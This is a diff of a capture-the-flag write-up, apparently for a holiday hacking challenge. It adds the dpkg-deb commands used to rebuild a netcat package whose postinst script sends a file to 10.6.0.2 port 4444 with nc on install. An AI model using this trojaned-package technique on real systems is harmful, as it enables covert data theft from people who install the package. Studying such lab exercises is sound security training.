@@ -37,6 +37,13 @@ On the device the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb`
 This package was modified to include this line in the postinst script:
 
     /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+```
+guest@faf32a4d4929:~/debs$ mkdir tmp
+guest@faf32a4d4929:~/debs$ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
+guest@faf32a4d4929:~/debs$ vi tmp/DEBIAN/postinst 
+guest@faf32a4d4929:~/debs$ dpkg-deb -b tmp suriv
+dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.
+```
 
 and then made available in the web tree folder as `pub/jfrost/backdoor/suriv_amd64.deb`.
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
@@ -45,7 +52,7 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2Mz
-QzOTQ5NDEsMTIwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4Mzky
-MjE2LDUxNDIwOTE1OV19
+eyJoaXN0b3J5IjpbLTYxMjg5Nzc5OSwtODUyNzIyNzAzLDE3NT
+gyNDM2NzcsMTYzNDM5NDk0MSwxMjA0NDI2NTM5LC0xNzk4NDE1
+ODk2LC04NzgzOTIyMTYsNTE0MjA5MTU5XX0=
 -->
